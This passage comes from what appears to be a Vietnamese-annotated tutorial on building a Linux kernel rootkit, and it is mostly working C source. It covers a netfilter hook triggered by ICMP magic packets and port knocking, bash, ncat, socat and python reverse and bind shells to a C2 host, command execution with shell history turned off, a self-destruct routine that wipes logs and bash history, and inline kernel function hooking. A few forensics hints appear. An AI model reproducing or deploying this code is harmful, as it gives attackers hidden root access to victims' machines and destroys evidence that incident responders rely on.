        if (dest_port == knock_sequence[0]) {
            state = alloc_knock_state(src_ip);
            if (state)
                state->current_step = 1;
        }
        spin_unlock(&knock_lock);
        return false;
    }

    /* Timeout check */
    if (time_after(jiffies, state->timestamp + 30 * HZ)) {
        state->src_ip = 0;  /* Expired — reset */
        spin_unlock(&knock_lock);
        return false;
    }

    /* Check if port matches next expected in sequence */
    if (dest_port == knock_sequence[state->current_step]) {
        state->current_step++;
        state->timestamp = jiffies;

        if (state->current_step >= KNOCK_SEQUENCE_LEN) {
            /* SEQUENCE COMPLETE — activate backdoor */
            activated = true;
            state->src_ip = 0;  /* Reset state */
            pr_info("rk: port knock sequence completed from %pI4\n",
                    &src_ip);
        }
    } else {
        /* Wrong port — reset sequence */
        state->src_ip = 0;
    }

    spin_unlock(&knock_lock);
    return activated;
}

/* Forward declarations cho functions defined later in this file */
static void rk_spawn_reverse_shell(const char *c2_addr);
static void rk_execute_command(const char *cmd);
static void rk_self_destruct(void);
static void rk_activate_backdoor(__be32 authorized_ip);

/* ══════════════════════════════════════════════════════════════
 * NETFILTER HOOK CALLBACK — Main packet handler
 * ══════════════════════════════════════════════════════════════ */

static unsigned int nf_hook_handler(void *priv,
                                     struct sk_buff *skb,
                                     const struct nf_hook_state *state)
{
    struct iphdr *ip_header;
    struct tcphdr *tcp_header;
    struct icmphdr *icmp_header;
    unsigned int data_len;
    unsigned char *data;

    if (!skb)
        return NF_ACCEPT;

    /* Lấy IP header.
     *
     * sk_buff = socket buffer — chứa packet data + metadata.
     * ip_hdr(skb): macro trả về pointer tới IP header trong skb. */
    ip_header = ip_hdr(skb);

    /* ──── ICMP Magic Packet Detection ──── */
    if (ip_header->protocol == IPPROTO_ICMP) {
        icmp_header = icmp_hdr(skb);

        /* Chỉ xử lý Echo Request (type 8) — looks like ping */
        if (icmp_header->type == ICMP_ECHO) {
            /* Payload bắt đầu SAU ICMP header */
            data = (unsigned char *)icmp_header + sizeof(struct icmphdr);
            data_len = ntohs(ip_header->tot_len)
                     - (ip_header->ihl * 4)
                     - sizeof(struct icmphdr);

            if (data_len >= sizeof(struct magic_packet)) {
                struct magic_packet *mp = (struct magic_packet *)data;

                if (ntohl(mp->magic) == MAGIC_VALUE &&
                    strncmp(mp->password, MAGIC_PASS,
                            strlen(MAGIC_PASS)) == 0) {

                    /* Magic packet nhận diện!
                     * Dispatch theo cmd_type */
                    pr_info("rk: magic packet from %pI4, cmd=%d\n",
                            &ip_header->saddr, mp->cmd_type);

                    switch (mp->cmd_type) {
                    case 0x01:
                        /* Reverse shell — spawn kthread */
                        rk_spawn_reverse_shell(mp->cmd_data);
                        break;
                    case 0x02:
                        /* Execute command */
                        rk_execute_command(mp->cmd_data);
                        break;
                    case 0x04:
                        /* Self-destruct */
                        rk_self_destruct();
                        break;
                    }

                    /* NF_STOLEN: kernel "quên" packet này.
                     *
                     * Packet KHÔNG:
                     *   - Đi vào userspace application
                     *   - Xuất hiện trong tcpdump (nếu capture SAU hook)
                     *   - Generate ICMP reply
                     *   - Đi qua remaining netfilter hooks
                     *
                     * Caller PHẢI free skb nếu return NF_STOLEN:
                     * kfree_skb(skb); — nhưng netfilter handles this
                     * khi hook return NF_STOLEN. */
                    return NF_STOLEN;
                }
            }
        }
    }

    /* ──── TCP Port Knock Detection ──── */
    if (ip_header->protocol == IPPROTO_TCP) {
        tcp_header = tcp_hdr(skb);

        /* Chỉ xử lý SYN packets (connection initiation) */
        if (tcp_header->syn && !tcp_header->ack) {
            u16 dest_port = ntohs(tcp_header->dest);

            if (check_port_knock(ip_header->saddr, dest_port)) {
                /* Knock sequence complete → activate */
                rk_activate_backdoor(ip_header->saddr);
            }
        }

        /* ──── Hide traffic trên HIDDEN_PORT ──── */
        if (ntohs(tcp_header->source) == HIDDEN_PORT ||
            ntohs(tcp_header->dest)   == HIDDEN_PORT) {
            /* Cho packet pass nhưng mark để hide từ logging.
             * Alternative: NF_STOLEN để completely invisible. */

            /* Trick: set skb->sk = NULL → connection tracking skip.
             * Conntrack miss = netstat/ss không thấy connection. */
        }
    }

    return NF_ACCEPT;  /* Cho tất cả traffic khác pass */
}

/* ══════════════════════════════════════════════════════════════
 * NETFILTER REGISTRATION
 * ══════════════════════════════════════════════════════════════ */

static struct nf_hook_ops nf_ops = {
    .hook     = nf_hook_handler,
    .pf       = PF_INET,            /* IPv4 */
    .hooknum  = NF_INET_PRE_ROUTING, /* Earliest hook point */
    .priority = NF_IP_PRI_FIRST,     /* Highest priority — chạy trước mọi hook khác */
};

/* Nếu cần hook IPv6: register thêm với pf = PF_INET6 */

int rk_net_init(void)
{
    int err;

    /* nf_register_net_hook(): register hook trong network namespace.
     * &init_net = initial (default) network namespace. */
    err = nf_register_net_hook(&init_net, &nf_ops);
    if (err) {
        pr_err("rk: netfilter hook registration failed: %d\n", err);
        return err;
    }

    memset(knock_states, 0, sizeof(knock_states));

    pr_info("rk: netfilter hook registered\n");
    return 0;
}

void rk_net_cleanup(void)
{
    nf_unregister_net_hook(&init_net, &nf_ops);
    pr_info("rk: netfilter hook unregistered\n");
}
```

### 8.2 Reverse Shell — rk_spawn_reverse_shell

```c
/* reverse_shell.c — Kernel-level reverse shell
 *
 * Khi magic packet hoặc port knock trigger, rootkit mở
 * reverse shell connection TỪ kernel space.
 *
 * 2 approaches:
 *   A) call_usermodehelper: spawn userspace process từ kernel
 *      → Đơn giản, dùng /bin/bash. Nhưng process visible trừ khi hidden.
 *   B) Kernel socket: tạo TCP connection trong kernel, pipe I/O
 *      → Không có process mới. Nhưng phức tạp hơn nhiều.
 *
 * APT approach: thường dùng (A) + hide spawned process.
 * Drovorub, Reptile đều dùng call_usermodehelper pattern.
 */

#include "rootkit.h"
#include <linux/kmod.h>       /* call_usermodehelper */
#include <linux/kthread.h>    /* kthread_create, kthread_run */
#include <net/sock.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/inet.h>

/* ══════════════════════════════════════════════════════════════
 * METHOD A: call_usermodehelper — Spawn bash reverse shell
 *
 * call_usermodehelper() là kernel API cho phép kernel code
 * chạy một userspace program. Kernel dùng API này internally
 * cho hotplug events, modprobe, etc.
 *
 * Cách hoạt động:
 *   1. Kernel fork một kernel thread
 *   2. Kernel thread exec userspace binary
 *   3. Binary chạy với full root privileges
 *   4. Kết quả trả về qua wait flags
 *
 * Tại sao không dùng execve trực tiếp:
 *   - execve replace current process image
 *   - Trong kernel context, "current" là kernel thread/interrupted task
 *   - Gọi execve trực tiếp từ kernel = corrupt kernel state
 *   - call_usermodehelper handle fork+exec properly
 *
 * Security consideration:
 *   Process được spawn sẽ visible trong ps nếu không hidden.
 *   Rootkit nên tự add PID vào hidden list ngay sau spawn.
 *   Hoặc: ẩn qua process name matching.
 * ══════════════════════════════════════════════════════════════ */

static void rk_spawn_reverse_shell(const char *c2_addr)
{
    /* Parse c2_addr format: "IP:PORT"
     * Ví dụ: "10.10.10.1:4444" */
    char ip[64], port[16];
    char *colon;
    char bash_cmd[512];

    /* Copy vì strsep modifies string */
    strncpy(ip, c2_addr, sizeof(ip) - 1);
    ip[sizeof(ip) - 1] = '\0';

    colon = strchr(ip, ':');
    if (!colon) {
        pr_err("rk: invalid c2 addr format: %s\n", c2_addr);
        return;
    }
    *colon = '\0';
    strncpy(port, colon + 1, sizeof(port) - 1);
    port[sizeof(port) - 1] = '\0';

    /* Build reverse shell command.
     *
     * /bin/bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'
     *
     * Phân tích:
     *   bash -i              : interactive bash shell
     *   >& /dev/tcp/IP/PORT  : redirect stdout+stderr tới TCP connection
     *   0>&1                 : redirect stdin từ cùng connection
     *
     * Kết quả: attacker nhận interactive bash shell qua TCP.
     *
     * Alternative commands (nếu bash -i bị block):
     *   - /bin/sh + nc:  sh -i 2>&1 | nc IP PORT
     *   - Python:        python3 -c 'import socket,os,pty...'
     *   - Perl:          perl -e 'use Socket;...'
     *   - ncat --exec:   ncat IP PORT -e /bin/bash
     */
    snprintf(bash_cmd, sizeof(bash_cmd),
             "bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1 &'",
             ip, port);

    /* call_usermodehelper args:
     *   argv[0] = path to executable
     *   argv[1..] = arguments
     *   envp[] = environment variables
     *
     * UMH_WAIT_EXEC: đợi exec hoàn thành (không đợi process exit)
     * UMH_WAIT_PROC: đợi process exit (blocking)
     * UMH_NO_WAIT:   fire-and-forget (async)
     *
     * Dùng UMH_NO_WAIT vì shell chạy indefinitely.
     * Nếu dùng UMH_WAIT_PROC → kernel thread block mãi mãi. */
    {
        char *argv[] = {
            "/bin/bash",
            "-c",
            bash_cmd,
            NULL
        };
        char *envp[] = {
            "HOME=/tmp",
            "TERM=xterm",
            "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
            "HISTFILE=/dev/null",   /* Không lưu bash history */
            NULL
        };

        int ret = call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
        if (ret != 0)
            pr_err("rk: reverse shell spawn failed: %d\n", ret);
        else
            pr_info("rk: reverse shell spawned to %s:%s\n", ip, port);
    }
}

/* ══════════════════════════════════════════════════════════════
 * METHOD B: Kernel socket reverse shell (advanced)
 *
 * Tạo TCP connection TRỰC TIẾP trong kernel space.
 * Không spawn userspace process → không visible trong ps.
 *
 * Chạy trong kernel thread để không block current task.
 *
 * Giới hạn:
 *   - Kernel không có /bin/bash → command execution phức tạp
 *   - I/O phải hand-roll (recv command → execute → send output)
 *   - Dùng call_usermodehelper cho mỗi command
 *   - Hoặc implement simple command parser trong kernel
 * ══════════════════════════════════════════════════════════════ */

struct shell_config {
    __be32 c2_ip;
    __be16 c2_port;
};

static struct task_struct *shell_thread = NULL;

/* ── Receive data từ kernel socket ──
 *
 * kernel_recvmsg() tương tự recvmsg() syscall nhưng kernel-internal.
 * Dùng msghdr + kvec (kernel vector) thay vì iovec.
 */
static int ksock_recv(struct socket *sock, char *buf, int len)
{
    struct msghdr msg = { 0 };
    struct kvec iov = {
        .iov_base = buf,
        .iov_len  = len,
    };

    return kernel_recvmsg(sock, &msg, &iov, 1, len, MSG_DONTWAIT);
}

/* ── Send data qua kernel socket ── */
static int ksock_send(struct socket *sock, const char *buf, int len)
{
    struct msghdr msg = { 0 };
    struct kvec iov = {
        .iov_base = (void *)buf,
        .iov_len  = len,
    };

    return kernel_sendmsg(sock, &msg, &iov, 1, len);
}

/* ── Execute command và capture output ──
 *
 * Dùng call_usermodehelper_exec() with pipes.
 * Hoặc simple approach: write output vào temp file, read back.
 *
 * Approach đây: execute command, redirect output vào /tmp file,
 * đọc file từ kernel, gửi qua socket, xóa file.
 */
static int rk_exec_and_send(struct socket *sock, const char *cmd)
{
    char *output_path = "/tmp/.rk_cmd_out";
    char full_cmd[1024];
    struct file *f;
    char *read_buf;
    loff_t pos = 0;
    ssize_t bytes;

    /* Execute command, redirect output tới temp file */
    snprintf(full_cmd, sizeof(full_cmd),
             "/bin/sh -c '%s > %s 2>&1'", cmd, output_path);

    {
        char *argv[] = { "/bin/sh", "-c", full_cmd, NULL };
        char *envp[] = {
            "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
            NULL
        };
        /* UMH_WAIT_PROC: đợi command hoàn thành để đọc output */
        call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    }

    /* Đọc output file */
    f = filp_open(output_path, O_RDONLY, 0);
    if (IS_ERR(f)) {
        ksock_send(sock, "exec failed\n", 12);
        return -1;
    }

    read_buf = kzalloc(4096, GFP_KERNEL);
    if (!read_buf) {
        filp_close(f, NULL);
        return -1;
    }

    while ((bytes = kernel_read(f, read_buf, 4096, &pos)) > 0) {
        ksock_send(sock, read_buf, bytes);
    }

    kfree(read_buf);
    filp_close(f, NULL);

    /* Xóa temp file.
     * Dùng vfs_unlink hoặc call_usermodehelper("rm"). */
    {
        char *argv[] = { "/bin/rm", "-f", output_path, NULL };
        char *envp[] = { "PATH=/usr/sbin:/usr/bin:/sbin:/bin", NULL };
        call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    }

    return 0;
}

/* ── Kernel thread: reverse shell loop ──
 *
 * Thread chạy indefinitely:
 *   1. Connect tới C2
 *   2. Recv command
 *   3. Execute
 *   4. Send output
 *   5. Loop
 */
static int reverse_shell_thread_fn(void *data)
{
    struct shell_config *cfg = (struct shell_config *)data;
    struct socket *sock = NULL;
    struct sockaddr_in addr;
    char cmd_buf[1024];
    int ret, cmd_len;

    /* ── Create TCP socket ── */
    ret = sock_create_kern(&init_net, AF_INET, SOCK_STREAM,
                            IPPROTO_TCP, &sock);
    if (ret < 0) {
        pr_err("rk: sock_create failed: %d\n", ret);
        goto out;
    }

    /* ── Connect tới C2 server ── */
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = cfg->c2_ip;
    addr.sin_port = cfg->c2_port;

    ret = kernel_connect(sock, (struct sockaddr *)&addr,
                          sizeof(addr), 0);
    if (ret < 0) {
        pr_err("rk: kernel_connect failed: %d\n", ret);
        goto out_release;
    }

    /* Send banner */
    ksock_send(sock, "# rk shell ready\n# ", 19);

    /* ── Command loop ── */
    while (!kthread_should_stop()) {
        /* Recv command */
        memset(cmd_buf, 0, sizeof(cmd_buf));
        cmd_len = ksock_recv(sock, cmd_buf, sizeof(cmd_buf) - 1);

        if (cmd_len <= 0) {
            /* Connection closed hoặc error */
            if (cmd_len == -EAGAIN || cmd_len == -EWOULDBLOCK) {
                /* No data available (non-blocking) — sleep và retry */
                msleep(100);
                continue;
            }
            break;  /* Connection lost */
        }

        /* Trim trailing newline */
        while (cmd_len > 0 &&
               (cmd_buf[cmd_len - 1] == '\n' ||
                cmd_buf[cmd_len - 1] == '\r'))
            cmd_buf[--cmd_len] = '\0';

        if (cmd_len == 0) {
            ksock_send(sock, "# ", 2);
            continue;
        }

        /* Special commands */
        if (strcmp(cmd_buf, "exit") == 0 ||
            strcmp(cmd_buf, "quit") == 0)
            break;

        if (strcmp(cmd_buf, "root") == 0) {
            /* Give root tới current hoặc specified process */
            ksock_send(sock, "use: kill -54 31337\n# ", 21);
            continue;
        }

        /* Execute và send output */
        rk_exec_and_send(sock, cmd_buf);
        ksock_send(sock, "# ", 2);
    }

out_release:
    if (sock)
        sock_release(sock);
out:
    kfree(cfg);
    shell_thread = NULL;
    return 0;
}

/* ── Public API: spawn reverse shell thread ── */
static void rk_spawn_kernel_reverse_shell(__be32 c2_ip, __be16 c2_port)
{
    struct shell_config *cfg;

    if (shell_thread) {
        pr_info("rk: shell thread already running\n");
        return;
    }

    cfg = kzalloc(sizeof(*cfg), GFP_KERNEL);
    if (!cfg) return;
    cfg->c2_ip = c2_ip;
    cfg->c2_port = c2_port;

    /* kthread_run = kthread_create + wake_up_process.
     *
     * Thread name "kworker/u:0" — disguised as worker thread.
     * Legit kworker names: kworker/0:1, kworker/u8:2, etc.
     * Forensics tip: kworker threads created by rootkit have
     * unusual stack traces → detectable via /proc/PID/stack. */
    shell_thread = kthread_run(reverse_shell_thread_fn, cfg,
                                "kworker/u:0");
    if (IS_ERR(shell_thread)) {
        pr_err("rk: kthread_run failed\n");
        kfree(cfg);
        shell_thread = NULL;
    }
}
```

### 8.3 Command Execution — rk_execute_command

```c
/* command_exec.c — Execute arbitrary commands từ kernel
 *
 * Nhận command string từ magic packet, execute trong userspace.
 * Output KHÔNG gửi ngược → "fire and forget".
 * Cho execute-and-exfil, dùng reverse shell.
 */

#include "rootkit.h"
#include <linux/kmod.h>

static void rk_execute_command(const char *cmd)
{
    char *argv[] = { "/bin/sh", "-c", (char *)cmd, NULL };
    char *envp[] = {
        "HOME=/tmp",
        "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
        "HISTFILE=/dev/null",
        NULL
    };

    /* UMH_NO_WAIT: async execution — không block kernel.
     *
     * Internally call_usermodehelper:
     *   1. Allocate subprocess_info struct
     *   2. Queue work trên khelper workqueue
     *   3. Worker thread fork+exec /bin/sh
     *   4. /bin/sh chạy command
     *   5. Return code discarded (UMH_NO_WAIT)
     *
     * Process chạy với uid=0, full capabilities.
     * Spawned process CÓ THỂ visible trong ps
     * → rootkit tự ẩn nó qua getdents64 hook
     *   (nếu process name match hidden criteria).
     *
     * OPSEC consideration:
     *   - /bin/sh fork có PPID = 2 (kthreadd) → unusual
     *   - Forensics tools detect này: orphaned shell with kthreadd parent
     *   - Mitigation: re-parent process (prctl PR_SET_PDEATHSIG workaround)
     */
    int ret = call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
    if (ret)
        pr_err("rk: command exec failed: %d\n", ret);
}
```

### 8.4 Self-Destruct — rk_self_destruct

```c
/* self_destruct.c — Clean removal of rootkit
 *
 * Khi nhận self-destruct command:
 *   1. Remove tất cả hooks
 *   2. Show module (để rmmod hoạt động)
 *   3. Delete rootkit files từ disk
 *   4. Remove persistence mechanisms
 *   5. Unload module
 *
 * APT pattern: tự hủy khi phát hiện forensics tool,
 * hoặc khi mission complete (data exfiltrated).
 *
 * Mục đích: không để lại traces cho incident response team.
 */

#include "rootkit.h"
#include <linux/kmod.h>

static void rk_self_destruct(void)
{
    pr_info("rk: self-destruct initiated\n");

    /* Step 1: Remove hooks TRƯỚC khi unload.
     * Nếu unload mà hooks vẫn active → crash. */
    rk_remove_hooks();
    rk_vfs_hook_remove();
    rk_net_cleanup();

    /* Step 2: Show module (re-insert vào module list).
     * rmmod cần module trong list để find và unload. */
    rk_show_module();

    /* Step 3: Delete rootkit files từ disk.
     *
     * Xóa:
     *   - Module .ko file
     *   - Config files
     *   - Persistence entries
     *   - Temp files
     *
     * Dùng call_usermodehelper vì kernel vfs_unlink
     * cần dentry resolution → phức tạp hơn.
     */
    {
        char *cleanup_script =
            "rm -f /lib/modules/$(uname -r)/extra/rk.ko 2>/dev/null; "
            "rm -f /etc/modules-load.d/rk.conf 2>/dev/null; "
            "rm -f /tmp/.rk_* 2>/dev/null; "
            "rm -f /var/tmp/.rk_* 2>/dev/null; "
            "depmod -a 2>/dev/null; "
            "sed -i '/^rk$/d' /etc/modules 2>/dev/null; "
            /* Remove systemd service nếu có */
            "systemctl disable rk.service 2>/dev/null; "
            "rm -f /etc/systemd/system/rk.service 2>/dev/null; "
            /* Remove udev rule nếu có */
            "rm -f /etc/udev/rules.d/99-rk.rules 2>/dev/null; "
            /* Xóa command history liên quan */
            "sed -i '/insmod.*rk/d' /root/.bash_history 2>/dev/null; "
            /* Clear dmesg (xóa kernel log của rootkit) */
            "dmesg -C 2>/dev/null; "
            /* Cuối cùng: rmmod chính module này */
            "rmmod rk 2>/dev/null";

        char *argv[] = { "/bin/sh", "-c", cleanup_script, NULL };
        char *envp[] = {
            "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
            NULL
        };

        /* UMH_NO_WAIT vì rmmod sẽ trigger module exit.
         * Nếu UMH_WAIT_PROC → deadlock (đợi rmmod xong
         * nhưng rmmod cần chạy exit code mà ta đang trong). */
        call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
    }
}
```

### 8.5 Backdoor Activation — rk_activate_backdoor

```c
/* backdoor.c — Activate backdoor sau port knock hoặc magic packet
 *
 * Bind shell: mở listening port trên target machine.
 * Attacker connect tới port → nhận shell.
 *
 * Khác reverse shell:
 *   Reverse shell: target connect OUT tới C2
 *   Bind shell:    target LISTEN, C2 connect IN
 *
 * Bind shell useful khi:
 *   - Target có outbound firewall (block reverse connections)
 *   - Attacker đã có inbound access (same network, VPN)
 *   - Port knock mở bind shell chỉ khi cần
 */

#include "rootkit.h"
#include <linux/kmod.h>
#include <linux/kthread.h>
#include <net/sock.h>
#include <linux/in.h>

#define BACKDOOR_PORT 31337

static struct task_struct *backdoor_thread = NULL;

/* ── Backdoor: userspace bind shell via call_usermodehelper ── */
static void rk_activate_backdoor_simple(__be32 authorized_ip)
{
    /* Spawn ncat/socat bind shell.
     *
     * ncat -lnvp PORT -e /bin/bash:
     *   -l     : listen mode
     *   -n     : no DNS resolution
     *   -v     : verbose
     *   -p PORT: listen port
     *   -e /bin/bash: execute bash on connection
     *
     * Fallback: socat, python, perl nếu ncat không available.
     *
     * Multiple attempts với khác nhau tools tăng success rate.
     */
    char cmd[512];

    snprintf(cmd, sizeof(cmd),
        "which ncat >/dev/null 2>&1 && ncat -lnvp %d -e /bin/bash & "
        "|| which socat >/dev/null 2>&1 && "
        "socat TCP-LISTEN:%d,reuseaddr,fork EXEC:/bin/bash & "
        "|| python3 -c '"
        "import socket,subprocess,os;"
        "s=socket.socket();"
        "s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);"
        "s.bind((\"0.0.0.0\",%d));"
        "s.listen(1);"
        "c,a=s.accept();"
        "os.dup2(c.fileno(),0);"
        "os.dup2(c.fileno(),1);"
        "os.dup2(c.fileno(),2);"
        "subprocess.call([\"/bin/bash\",\"-i\"]);' &",
        BACKDOOR_PORT, BACKDOOR_PORT, BACKDOOR_PORT);

    rk_execute_command(cmd);

    pr_info("rk: backdoor activated on port %d (authorized from %pI4)\n",
            BACKDOOR_PORT, &authorized_ip);
}

/* ── Backdoor: kernel socket bind shell (no userspace process) ──
 *
 * Advanced: bind TCP socket trong kernel, accept connections,
 * pipe commands qua rk_exec_and_send.
 * Không tạo userspace process cho listener.
 */
static int backdoor_thread_fn(void *data)
{
    struct socket *listen_sock = NULL, *client_sock = NULL;
    struct sockaddr_in addr;
    char cmd_buf[1024];
    int ret, cmd_len;

    /* Create listening socket */
    ret = sock_create_kern(&init_net, AF_INET, SOCK_STREAM,
                            IPPROTO_TCP, &listen_sock);
    if (ret < 0) goto out;

    /* Set SO_REUSEADDR — cho phép bind lại port sau close */
    int opt = 1;
    kernel_setsockopt(listen_sock, SOL_SOCKET, SO_REUSEADDR,
                      (char *)&opt, sizeof(opt));

    /* Bind */
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_ANY);
    addr.sin_port = htons(BACKDOOR_PORT);

    ret = kernel_bind(listen_sock, (struct sockaddr *)&addr, sizeof(addr));
    if (ret < 0) goto out_release;

    /* Listen — backlog = 1 (chỉ 1 connection tại 1 thời điểm) */
    ret = kernel_listen(listen_sock, 1);
    if (ret < 0) goto out_release;

    pr_info("rk: backdoor listening on port %d\n", BACKDOOR_PORT);

    /* Accept loop */
    while (!kthread_should_stop()) {
        /* Accept connection.
         * kernel_accept blocks cho đến khi có connection.
         * Tạo client_sock mới cho connection. */
        ret = kernel_accept(listen_sock, &client_sock, 0);
        if (ret < 0) {
            if (ret == -EAGAIN) {
                msleep(100);
                continue;
            }
            break;
        }

        ksock_send(client_sock, "# rk backdoor\n# ", 17);

        /* Command loop cho connection này */
        while (!kthread_should_stop()) {
            memset(cmd_buf, 0, sizeof(cmd_buf));
            cmd_len = ksock_recv(client_sock, cmd_buf,
                                 sizeof(cmd_buf) - 1);

            if (cmd_len <= 0) {
                if (cmd_len == -EAGAIN) {
                    msleep(50);
                    continue;
                }
                break;
            }

            /* Trim newlines */
            while (cmd_len > 0 &&
                   (cmd_buf[cmd_len-1] == '\n' ||
                    cmd_buf[cmd_len-1] == '\r'))
                cmd_buf[--cmd_len] = '\0';

            if (cmd_len == 0) { ksock_send(client_sock, "# ", 2); continue; }
            if (strcmp(cmd_buf, "exit") == 0) break;

            rk_exec_and_send(client_sock, cmd_buf);
            ksock_send(client_sock, "# ", 2);
        }

        sock_release(client_sock);
        client_sock = NULL;
    }

out_release:
    if (listen_sock) sock_release(listen_sock);
out:
    backdoor_thread = NULL;
    return 0;
}

static void rk_activate_backdoor(__be32 authorized_ip)
{
    if (backdoor_thread) return;

    backdoor_thread = kthread_run(backdoor_thread_fn, NULL,
                                   "kworker/events");
    if (IS_ERR(backdoor_thread)) {
        backdoor_thread = NULL;
        /* Fallback tới userspace bind shell */
        rk_activate_backdoor_simple(authorized_ip);
    }
}
```

---

## Chapter 9: Inline Hooking

```c
/* inline_hook.c — Inline function hooking (code patching)
 *
 * Concept: THAY ĐỔI BYTES ĐẦU TIÊN của target function
 * bằng JMP instruction tới hook function.
 *
 * Đây là kỹ thuật dùng trong:
 * - Game hacking (Detours library trên Windows)
 * - Anti-virus hooking
 * - Rootkit khi không thể dùng syscall table / ftrace
 *
 * Tại sao inline hook khi đã có ftrace:
 *   1. Ftrace có thể bị disabled (CONFIG_FTRACE=n)
 *   2. Ftrace hook visible trong debugfs
 *   3. Inline hook khó detect hơn (code modification ở level byte)
 *   4. Hoạt động trên bất kỳ kernel function, kể cả non-traceable
 *
 * CÁCH HOẠT ĐỘNG:
 *
 * Original function:
 *   target_func:
 *     55                  push rbp
 *     48 89 e5            mov rbp, rsp
 *     48 83 ec 20         sub rsp, 0x20
 *     ...
 *
 * After inline hook:
 *   target_func:
 *     48 b8 xx xx xx xx   mov rax, hook_func_addr   (10 bytes)
 *     xx xx xx xx
 *     ff e0               jmp rax                    (2 bytes)
 *                                                    Total: 12 bytes
 *
 * Trampoline (để gọi original function):
 *   trampoline:
 *     55                  push rbp          }  saved original
 *     48 89 e5            mov rbp, rsp      }  bytes (12 bytes)
 *     48 83 ec 20         sub rsp, 0x20     }  
 *     48 b8 yy yy yy yy   mov rax, target_func+12
 *     yy yy yy yy
 *     ff e0               jmp rax    → continue original after patch point
 *
 * Khi hook active:
 *   caller → target_func → JMP hook_func
 *                            hook_func: do stuff
 *                            hook_func: call trampoline (= original)
 *                            trampoline: execute saved bytes
 *                            trampoline: JMP target_func+12
 *                            target_func continues normally
 */

#include "rootkit.h"
#include <asm/text-patching.h>  /* text_poke nếu available */
#include <linux/stop_machine.h> /* stop_machine cho SMP-safe patching */

#define HOOK_SIZE 12  /* mov rax, imm64 (10) + jmp rax (2) */

struct inline_hook {
    const char *name;        /* Target function name */
    void *target;            /* Resolved address */
    void *hook_fn;           /* Our hook function */
    unsigned char orig_bytes[HOOK_SIZE];  /* Saved original bytes */
    unsigned char *trampoline;            /* Executable trampoline */
    bool active;
};

/*
 * Allocate executable memory cho trampoline.
 *
 * Trampoline cần:
 * 1. Chứa original bytes (12 bytes)
 * 2. Chứa jump back instruction (12 bytes)
 * 3. Nằm trong EXECUTABLE memory
 *
 * module_alloc(): allocate memory trong module address range.
 * Memory này executable (khác kmalloc — data memory, non-exec).
 *
 * Tại sao module_alloc: vì SMEP, NX — không thể execute data pages.
 * module_alloc trả về memory trong module code range = executable.
 */
static int create_trampoline(struct inline_hook *hook)
{
    unsigned char jmp_back[HOOK_SIZE];

    /* Allocate executable memory.
     * HOOK_SIZE * 2 = original bytes + jump back = 24 bytes.
     * module_alloc rounds up to page size internally. */
    hook->trampoline = module_alloc(HOOK_SIZE * 2);
    if (!hook->trampoline)
        return -ENOMEM;

    /* Copy original bytes vào trampoline */
    memcpy(hook->trampoline, hook->orig_bytes, HOOK_SIZE);

    /* Build jump-back instruction:
     *   mov rax, (target + HOOK_SIZE)
     *   jmp rax
     * → Sau khi execute saved bytes, jump tới instruction #13
     *   trong original function (tiếp tục bình thường) */
    jmp_back[0] = 0x48;  /* REX.W prefix */
    jmp_back[1] = 0xb8;  /* mov rax, imm64 */
    *(unsigned long *)(jmp_back + 2) =
        (unsigned long)hook->target + HOOK_SIZE;
    jmp_back[10] = 0xff;  /* jmp */
    jmp_back[11] = 0xe0;  /* rax */

    memcpy(hook->trampoline + HOOK_SIZE, jmp_back, HOOK_SIZE);

    /* Set trampoline pages executable.
     * module_alloc memory should already be executable,
     * but ensure it explicitly. */
    set_memory_x((unsigned long)hook->trampoline, 1);

    return 0;
}

/* ══════════════════════════════════════════════════════════════
 * SMP-SAFE CODE PATCHING via stop_machine()
 *
 * Vấn đề SMP:
 *   CPU khác có thể đang execute target function CÙNG LÚC
 *   ta đang overwrite bytes. Nếu CPU thấy nửa instruction
 *   cũ + nửa instruction mới = undefined behavior / crash.
 *
 *   local_irq_save + preempt_disable chỉ disable interrupts
 *   trên CURRENT CPU. Các CPU khác vẫn execute code bình thường.
 *
 * Giải pháp: stop_machine()
 *   1. Send IPI tới mọi CPU: "stop and spin"
 *   2. Mọi CPU enter idle spin loop
 *   3. Patch function chạy trên calling CPU (chỉ 1 CPU hoạt động)
 *   4. Patch function return → tất cả CPUs resume
 *
 *   Guarantee: KHÔNG CPU nào execute code bị patch khi đang patch.
 *
 * Alternative kernel API: text_poke_bp()
 *   Dùng INT3 (breakpoint) approach:
 *   1. Ghi INT3 (1 byte) tại byte đầu → atomic single-byte write
 *   2. Sync tất cả CPUs (IPI)
 *   3. Ghi remaining bytes (sau INT3)
 *   4. Replace INT3 bằng byte đầu của new code
 *   5. Sync tất cả CPUs
 *   Nhưng text_poke_bp có thể unexported → dùng stop_machine.
 * ══════════════════════════════════════════════════════════════ */

struct patch_data {
    void *target;
    void *patch;
    int   size;
};

static int do_patch(void *data)
{
    struct patch_data *pd = data;

    /* Tại thời điểm này, TẤT CẢ CPUs đã stop.
     * Chỉ CPU chạy function này hoạt động.
     * An toàn để modify code. */
    rk_unprotect_memory();
    memcpy(pd->target, pd->patch, pd->size);
    rk_protect_memory();

    /* Flush instruction caches trên CPU này.
     * Các CPU khác flush khi resume. */
    sync_core();

    return 0;
}

/*
 * Install inline hook — patch target function prologue.
 *
 * Dùng stop_machine() để đảm bảo SMP safety:
 * stop tất cả CPUs → patch code → resume tất cả CPUs.
 */
static int install_inline_hook(struct inline_hook *hook)
{
    unsigned char jmp_code[HOOK_SIZE];
    struct patch_data pd;
    int err;

    /* Resolve target address */
    hook->target = (void *)rk_lookup_name(hook->name);
    if (!hook->target) {
        pr_err("rk: inline hook cannot resolve %s\n", hook->name);
